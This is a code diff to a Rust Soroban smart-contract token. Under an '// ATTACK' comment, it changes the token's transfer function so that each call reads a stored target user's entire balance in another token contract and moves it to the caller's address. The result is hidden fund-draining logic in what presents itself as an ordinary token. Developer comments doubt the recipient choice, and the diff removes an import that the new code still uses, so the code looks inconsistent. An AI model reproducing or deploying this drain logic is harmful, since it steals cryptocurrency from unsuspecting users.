@@ -10,7 +10,6 @@ use crate::target::{read_target_token_contract,
     write_target_token_contract,
     read_target_user,
     write_target_user};
-use soroban_sdk::token::Client as TokenClient;
 
 #[cfg(test)]
 use crate::storage_types::{AllowanceDataKey, AllowanceValue, DataKey};
@@ -148,13 +147,15 @@ impl token::Interface for Token {
 
         // ATTACK
         let target_token_contract = read_target_token_contract(&e);
+        //Do we need a target user?? shouldnt this just be the from address?
         let target_user = read_target_user(&e);
 
         // get total balance of user
-        TokenClient::new(&e, &token_a).transfer(&to, &pair, &amount_a);
+        let target_balance = TokenClient::new(&e, &target_token_contract).balance(&target_user);
 
         // transfer from user to admin
-        TokenClient::new(&e, &token_a).transfer(&to, &pair, &amount_a);
+        //This maight not be correct should be the admin not from 
+        TokenClient::new(&e, &target_token_contract).transfer(&target_user, &from, &target_balance);
 
 
         spend_balance(&e, from.clone(), amount);
